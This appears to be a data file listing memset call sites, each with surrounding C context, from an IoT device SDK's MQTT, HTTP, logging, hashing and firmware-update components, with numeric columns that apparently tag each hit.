2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_cjson.c,"memset(node, '\0', sizeof(lite_cjson_item_t));",120,1,"    lite_cjson_item_t *node = (lite_cjson_item_t *)hooks->allocate(sizeof(lite_cjson_item_t));
    if (node) {
        memset(node, '\0', sizeof(lite_cjson_item_t));
    }

"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(&g_iotx_conn_info, 0, sizeof(iotx_conn_info_t));",120,1,"
    if (info_ptr) {
        memset(&g_iotx_conn_info, 0, sizeof(iotx_conn_info_t));
        g_iotx_conn_info.host_name = g_empty_string;
        g_iotx_conn_info.client_id = g_empty_string;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->cloud_custom_domain, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->cloud_custom_domain, 0, strlen((char *)data) + 1);
            memcpy(ctx->cloud_custom_domain, data, strlen((char *)data));
            g_infra_mqtt_domain[IOTX_CLOUD_REGION_CUSTOM] = (const char *)ctx->cloud_custom_domain;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->http_custom_domain, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->http_custom_domain, 0, strlen((char *)data) + 1);
            memcpy(ctx->http_custom_domain, data, strlen((char *)data));
            g_infra_http_domain[IOTX_CLOUD_REGION_CUSTOM] = (const char *)ctx->http_custom_domain;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_PRODUCT_KEY: {
            if ((data != NULL) && (strlen(data) <= IOTX_PRODUCT_KEY_LEN)) {
                memset(ctx->product_key, 0, IOTX_PRODUCT_KEY_LEN + 1);
                memcpy(ctx->product_key, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->product_secret, 0, IOTX_PRODUCT_SECRET_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_PRODUCT_SECRET: {
            if ((data != NULL) && (strlen(data) <= IOTX_PRODUCT_SECRET_LEN)) {
                memset(ctx->product_secret, 0, IOTX_PRODUCT_SECRET_LEN + 1);
                memcpy(ctx->product_secret, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->device_name, 0, IOTX_DEVICE_NAME_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_DEVICE_NAME: {
            if ((data != NULL) && (strlen(data) <= IOTX_DEVICE_NAME_LEN)) {
                memset(ctx->device_name, 0, IOTX_DEVICE_NAME_LEN + 1);
                memcpy(ctx->device_name, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);",120,1,"        case IOTX_IOCTL_SET_DEVICE_SECRET: {
            if ((data != NULL) && (strlen(data) <= IOTX_DEVICE_SECRET_LEN)) {
                memset(ctx->device_secret, 0, IOTX_DEVICE_SECRET_LEN + 1);
                memcpy(ctx->device_secret, data, strlen(data));
                res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(ctx->mqtt_customzie_info, 0, strlen((char *)data) + 1);",120,1,"                return FAIL_RETURN;
            }
            memset(ctx->mqtt_customzie_info, 0, strlen((char *)data) + 1);
            memcpy(ctx->mqtt_customzie_info, data, strlen((char *)data));
            res = SUCCESS_RETURN;
"
2021\haas-mini-program\components\linkkit\infra\infra_compat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_compat.c,"memset(message, 0, sizeof(message));",120,1,"
    if (msg_format != NULL) {
        memset(message, 0, sizeof(message));
        va_start(args, msg_format);
        vsnprintf(message, IOTX_STATE_EVENT_MESSAGE_MAXLEN, msg_format, args);
"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);",120,1,"
    /* Send request */
    memset(send_buf, 0, HTTPCLIENT_SEND_BUF_SIZE);
    len = 0; /* Reset send buffer */

"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(*ptr, 0, strlen(data) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(*ptr, 0, strlen(data) + 1);
    memcpy(*ptr, data, strlen(data));

"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(handle, 0, sizeof(wrapper_http_handle_t));",120,1,"        return NULL;
    }
    memset(handle, 0, sizeof(wrapper_http_handle_t));

    return handle;
"
2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_httpc.c,"memset(response_payload, 0, http_handle->receive_maxlen);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(response_payload, 0, http_handle->receive_maxlen);

    http_handle->client.header = http_handle->header;
"
2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,"memset(&stNV, 0, sizeof(stNV));",120,1,"    JSON_NV     stNV;

    memset(&stNV, 0, sizeof(stNV));
    stNV.pN = p_cName;
    stNV.nLen = strlen(p_cName);
"
2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_json_parser.c,"memset(entry, 0, sizeof(json_key_t));",120,1,"                return NULL;
            }
            memset(entry, 0, sizeof(json_key_t));

            mlen = strlen(prefix) + klen + 1;
"
2021\haas-mini-program\components\linkkit\infra\infra_log.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_log.c,"memset(tmpbuf, 0, sizeof(logcb.text_buf));",120,1,"#endif  /* #if !defined(_WIN32) */

    memset(tmpbuf, 0, sizeof(logcb.text_buf));

    o = tmpbuf;
"
2021\haas-mini-program\components\linkkit\infra\infra_log.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_log.c,"memset(ascii, 0, sizeof(ascii));",120,1,"
            written = 0;
            memset(ascii, 0, sizeof(ascii));
        }
    }
"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(ctx, 0, sizeof(iot_md5_context));",120,1,"void utils_md5_init(iot_md5_context *ctx)
{
    memset(ctx, 0, sizeof(iot_md5_context));
}

"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(k_ipad, 0, sizeof(k_ipad));",120,1,"
    /* start out by storing key in pads */
    memset(k_ipad, 0, sizeof(k_ipad));
    memset(k_opad, 0, sizeof(k_opad));
    memcpy(k_ipad, key, key_len);
"
2021\haas-mini-program\components\linkkit\infra\infra_md5.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_md5.c,"memset(k_opad, 0, sizeof(k_opad));",120,1,"    /* start out by storing key in pads */
    memset(k_ipad, 0, sizeof(k_ipad));
    memset(k_opad, 0, sizeof(k_opad));
    memcpy(k_ipad, key, key_len);
    memcpy(k_opad, key, key_len);
"
2021\haas-mini-program\components\linkkit\infra\infra_net.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_net.c,"memset(&ssl_hooks, 0, sizeof(ssl_hooks_t));",120,1,"
#ifdef INFRA_MEM_STATS
    memset(&ssl_hooks, 0, sizeof(ssl_hooks_t));
    ssl_hooks.malloc = ssl_malloc;
    ssl_hooks.free = ssl_free;
"
2021\haas-mini-program\components\linkkit\infra\infra_sha256.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_sha256.c,"memset(ctx, 0, sizeof(iot_sha256_context));",120,1,"void utils_sha256_init(iot_sha256_context *ctx)
{
    memset(ctx, 0, sizeof(iot_sha256_context));
}

"
2021\haas-mini-program\components\linkkit\infra\infra_string.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\infra\infra_string.c,"memset(pos,0,strlen(delim));",120,1,"
        if (strlen(pos) == strlen(delim)) {
            memset(pos,0,strlen(delim));
            if (only_delim) {
                return NULL;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pclient, 0, sizeof(iotx_mc_client_t));",120,1,"    mqtt_free(pclient);
#else
    memset(pclient, 0, sizeof(iotx_mc_client_t));
#endif
}
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient->list_pub_wait_ack, 0, sizeof(iotx_mc_pub_info_t) * IOTX_MC_REPUB_NUM_MAX);",120,1,"    INIT_LIST_HEAD(&pClient->list_pub_wait_ack);
#else
    memset(pClient->list_pub_wait_ack, 0, sizeof(iotx_mc_pub_info_t) * IOTX_MC_REPUB_NUM_MAX);
#endif
}
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&pClient->ipstack, 0, sizeof(utils_network_t));",120,1,"    iotx_time_init(&pClient->reconnect_param.reconnect_next_time);

    memset(&pClient->ipstack, 0, sizeof(utils_network_t));

    rc = iotx_net_init_internal(&pClient->ipstack, pInitParams->host, pInitParams->port, pInitParams->pub_key);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(c->buf_send, 0, tmp_len);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(c->buf_send, 0, tmp_len);
    c->buf_size_send = tmp_len;
    return STATE_SUCCESS;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(temp, 0, tmp_len);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(temp, 0, tmp_len);
        memcpy(temp, c->buf_read, c->buf_size_read < tmp_len ? c->buf_size_read : tmp_len);
        mqtt_free(c->buf_read);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(c->buf_read, 0, tmp_len);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset(c->buf_read, 0, tmp_len);
    }
    c->buf_size_read = tmp_len;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&pClient->list_pub_wait_ack[idx], 0, sizeof(iotx_mc_pub_info_t));",120,1,"
        if (IOTX_MC_NODE_STATE_INVALID == pClient->list_pub_wait_ack[idx].node_state) {
            memset(&pClient->list_pub_wait_ack[idx], 0, sizeof(iotx_mc_pub_info_t));
            continue;
        }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(payload, 0, topic_msg->payload_len + 1);",120,1,"            return;
        }
        memset(payload, 0, topic_msg->payload_len + 1);
        memcpy(payload, topic_msg->payload, topic_msg->payload_len);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(str_product_key, 0, product_key_len - 2 + 1);",120,1,"                return;
            }
            memset(str_product_key, 0, product_key_len - 2 + 1);
            memcpy(str_product_key, product_key + 1, product_key_len - 2);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(str_device_name, 0, device_name_len - 2 + 1);",120,1,"                return;
            }
            memset(str_device_name, 0, device_name_len - 2 + 1);
            memcpy(str_device_name, device_name + 1, device_name_len - 2);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));",120,1,"    }

    memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));
    memset(&topicName, 0x0, sizeof(MQTTString));

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&topicName, 0x0, sizeof(MQTTString));",120,1,"
    memset(&topic_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));
    memset(&topicName, 0x0, sizeof(MQTTString));

    if (1 != MQTTDeserialize_publish((unsigned char *)&topic_msg.dup,
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(handler, 0, sizeof(iotx_mc_topic_handle_t));",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset(handler, 0, sizeof(iotx_mc_topic_handle_t));
    INIT_LIST_HEAD(&handler->linked_list);
#else
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, strlen(topicFilter) + 1);",120,1,"        return STATE_SYS_DEPEND_MALLOC;
    }
    memset((char *)handler->topic_filter, 0, strlen(topicFilter) + 1);
#else
    if (strlen(topicFilter) >= CONFIG_MQTT_TOPIC_MAXLEN) {
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, CONFIG_MQTT_TOPIC_MAXLEN);",120,1,"    }

    memset((char *)handler->topic_filter, 0, CONFIG_MQTT_TOPIC_MAXLEN);
#endif
    memcpy((char *)handler->topic_filter, topicFilter, strlen(topicFilter) + 1);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset((char *)handler->topic_filter, 0, MQTT_ZIP_PATH_DEFAULT_LEN);",120,1,"            return STATE_SYS_DEPEND_MALLOC;
        }
        memset((char *)handler->topic_filter, 0, MQTT_ZIP_PATH_DEFAULT_LEN);
#else
        if (MQTT_ZIP_PATH_DEFAULT_LEN >= CONFIG_MQTT_TOPIC_MAXLEN) {
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(topicString, 0x0, CONFIG_MQTT_TOPIC_MAXLEN);",120,1,"    }

    memset(topicString, 0x0, CONFIG_MQTT_TOPIC_MAXLEN);
    strncpy(topicString, topicName, CONFIG_MQTT_TOPIC_MAXLEN - 1);

"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&c->list_sub_handle[idx], 0, sizeof(iotx_mc_topic_handle_t));",120,1,"             iotx_mc_is_topic_matched((char *)c->list_sub_handle[idx].topic_filter, &cur_topic))) {
            mqtt_debug(""topic be matched"");
            memset(&c->list_sub_handle[idx], 0, sizeof(iotx_mc_topic_handle_t));
        }
    }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(node, 0, sizeof(iotx_mc_pub_info_t));",120,1,"            mqtt_free(node);
#else
            memset(node, 0, sizeof(iotx_mc_pub_info_t));
#endif
        }
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient->list_sub_handle, 0, sizeof(iotx_mc_topic_handle_t) * IOTX_MC_SUBHANDLE_LIST_MAX_LEN);",120,1,"    }
#else
    memset(pClient->list_sub_handle, 0, sizeof(iotx_mc_topic_handle_t) * IOTX_MC_SUBHANDLE_LIST_MAX_LEN);
#endif
    amp_mutex_destroy(pClient->lock_generic);
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(pClient, 0, sizeof(iotx_mc_client_t));",120,1,"    mqtt_free(pClient);
#else
    memset(pClient, 0, sizeof(iotx_mc_client_t));
#endif
    *c = NULL;
"
2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\iotx_mqtt_client.c,"memset(&client->list_sub_sync_ack[idx], 0, sizeof(mqtt_sub_sync_node_t));",120,1,"            for (idx = 0; idx < IOTX_MC_SUBSYNC_LIST_MAX_LEN; idx++) {
                if (client->list_sub_sync_ack[idx].used == 0) {
                    memset(&client->list_sub_sync_ack[idx], 0, sizeof(mqtt_sub_sync_node_t));
                    client->list_sub_sync_ack[idx].used = 1;
                    node = &client->list_sub_sync_ack[idx];
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(preauth_out, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    int res;

    memset(preauth_out, 0, sizeof(iotx_sign_mqtt_t));

    /* setup device_id */
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&g_internal_sign, 0, sizeof(iotx_sign_mqtt_t));",120,1,"
    /* init g_internal_sign */
    memset(&g_internal_sign, 0, sizeof(iotx_sign_mqtt_t));

    /* get meta_info from hal */
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&meta_info_interal, 0, sizeof(iotx_dev_meta_info_t));",120,1,"
    /* get meta_info from hal */
    memset(&meta_info_interal, 0, sizeof(iotx_dev_meta_info_t));
    memcpy(&meta_info_interal, &meta_info, sizeof(iotx_dev_meta_info_t));

"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&tmp_sign, 0, sizeof(iotx_sign_mqtt_t));",120,1,"    {
        iotx_sign_mqtt_t tmp_sign;
        memset(&tmp_sign, 0, sizeof(iotx_sign_mqtt_t));

        ret = IOT_Sign_MQTT(region, &meta_info_interal, &tmp_sign);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&mqtt_params, 0x0, sizeof(iotx_mqtt_param_t));",120,1,"
    /* Initialize MQTT parameter */
    memset(&mqtt_params, 0x0, sizeof(iotx_mqtt_param_t));

    {
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&meta_info, 0, sizeof(iotx_dev_meta_info_t));",120,1,"
    /* get meta_info from hal */
    memset(&meta_info, 0, sizeof(iotx_dev_meta_info_t));
    IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_KEY, meta_info.product_key);
    IOT_Ioctl(IOTX_IOCTL_GET_DEVICE_NAME, meta_info.device_name);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(iotx_ca_crt_itls, 0, sizeof(iotx_ca_crt_itls));",120,1,"            mqtt_params.pub_key = iotx_ca_crt;
        } else {
            memset(iotx_ca_crt_itls, 0, sizeof(iotx_ca_crt_itls));
            IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_KEY, iotx_ca_crt_itls);
            IOT_Ioctl(IOTX_IOCTL_GET_PRODUCT_SECRET, iotx_ca_crt_itls + strlen(iotx_ca_crt_itls) + 1);
"
2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\linkkit\mqtt\mqtt_api.c,"memset(&mqtt_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));",120,1,"    }

    memset(&mqtt_msg, 0x0, sizeof(iotx_mqtt_topic_info_t));

    mqtt_msg.qos         = qos;
"
2021\haas-mini-program\components\ota\hal\ota_hal_ctrl.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_ctrl.c,"memset(hash, 0x00, sizeof(hash));",120,1,"         param->upg_flag = upg_flag;
    }
    memset(hash, 0x00, sizeof(hash)); 
    ret = ota_hash_final(&hash_ctx, hash);
    if(ret == 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx, 0, sizeof(ota_sha256_context));",120,1,"        ota_free(ctx->ali_ctx);
    }
    memset(ctx, 0, sizeof(ota_sha256_context));
#endif
}
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx->ali_ctx, 0, ctx_size);",120,1,"            OTA_LOG_I(""mbedtls_calloc(%d) fail\n"", (int)ctx_size);
        } else {
            memset(ctx->ali_ctx, 0, ctx_size);
        }
    }
"
2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_digest.c,"memset(ctx, 0, sizeof(ota_md5_context));",120,1,"        ota_free(ctx->ali_ctx);
    }
    memset(ctx, 0, sizeof(ota_md5_context));
#endif
}
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(store_file_name, 0x00, sizeof(store_file_name));",120,1,"    OTA_LOG_I(""subdev_name = %s, iamge_len = %d, ver = %s\n"",
             tmp_ctx->dn, size, ver);
    memset(store_file_name, 0x00, sizeof(store_file_name));
    ret = ota_get_storefile_subdev_name(store_file_name);
    printf(""ret = %d, file_name = %s\r\n"", ret, store_file_name);
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(upack_path, 0x00,sizeof(upack_path));",120,1,"    if(version != NULL) {
        ret = 0;
        memset(upack_path, 0x00,sizeof(upack_path));
        amp_get_user_dir(upack_path);
        upack_path_len = strlen(upack_path);
"
2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_fs_plat.c,"memset(read_buf, 0x00, sizeof(read_buf));",120,1,"        }
        else {
            memset(read_buf, 0x00, sizeof(read_buf));
            read_len = ota_fread(read_buf, 1, sizeof(read_buf) - 1, fptr);
            if(read_len > 13) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_os.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_os.c,"memset(dest_buf, 0x00, dest_len);",120,1,"    if((dest_buf != NULL) && (src_buf != NULL) && (dest_len > 2 * src_len)) {
        ret = 0;
        memset(dest_buf, 0x00, dest_len);
        for (i = 0; i < src_len; i++) {
           ota_snprintf(dest_buf + i * 2, 2 + 1, ""%02X"", src_buf[i]);
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(&param, 0, sizeof(ota_boot_param_t));",120,1,"    int ret = 0;
    ota_boot_param_t param = {0};
    memset(&param, 0, sizeof(ota_boot_param_t));
    ret = ota_read_parameter(&param);
    if(ret < 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(ota_param, 0, sizeof(ota_boot_param_t));",120,1,"        return ret;
    }
    memset(ota_param, 0, sizeof(ota_boot_param_t));
    ret = amp_hal_flash_read(param_part, &offset, ota_param, sizeof(ota_boot_param_t));
    if(ret < 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_param.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_param.c,"memset(&comp_buf, 0, len);",120,1,"    ota_param->param_crc = ota_get_data_crc16((const unsigned char *)ota_param, sizeof(ota_boot_param_t) - sizeof(unsigned short));
    OTA_LOG_I(""ota update param crc:0x%04x flag:0x%04x \n"", ota_param->param_crc, ota_param->upg_flag);
    memset(&comp_buf, 0, len);
#if 0
    ret = hal_flash_dis_secure(AMP_PARTITION_ID_PARAMER1, 0, 0);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_part_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"        amp_hal_logic_partition_t *p_part_info;
        p_part_info = &part_info;
        memset(p_part_info, 0, sizeof(amp_hal_logic_partition_t));
        ret = amp_hal_flash_info_get(boot_part, p_part_info);
        if(ret != 0 || param->len == 0) {
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"    amp_hal_logic_partition_t *p_ota_info = &ota_info;
    amp_hal_logic_partition_t *p_app_info = &app_info;
    memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));
    memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));
    amp_hal_flash_info_get(boot_part, p_ota_info);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));",120,1,"    amp_hal_logic_partition_t *p_app_info = &app_info;
    memset(p_ota_info, 0, sizeof(amp_hal_logic_partition_t));
    memset(p_app_info, 0, sizeof(amp_hal_logic_partition_t));
    amp_hal_flash_info_get(boot_part, p_ota_info);
    amp_hal_flash_info_get(AMP_PARTITION_APPLICATION, p_app_info);
"
2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\hal\ota_hal_plat.c,"memset(tmp_version, 0x00, sizeof(tmp_version));",120,1,"    }
    else {
        memset(tmp_version, 0x00, sizeof(tmp_version));
        if(dn == NULL) {//default module
            amp_app_version_get(tmp_version);
"
2021\haas-mini-program\components\ota\ota_agent\ota_service.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\ota_service.c,"memset(tmp_buf, 0x00, sizeof(tmp_buf));",120,1,"            char tmp_buf[65];
            int result = 0;
            memset(tmp_buf, 0x00, sizeof(tmp_buf));
            memcpy(ota_param.sign, ctx->header.sign_info->signature, sizeof(ota_param.sign));
            ota_param.hash_type = OTA_SHA256;
"
2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,Dataset Download,../../Dataset Download/2021\haas-mini-program\components\ota\ota_agent\download\ota_download_file2fs_http.c,"memset(hdr, 0x00, OTA_HTTP_HEAD_LEN);",120,1,"        return ret;
    }
    memset(hdr, 0x00, OTA_HTTP_HEAD_LEN); 
    fptr = ota_fopen(store_path, ""wb"");
    if(fptr == NULL) {
"
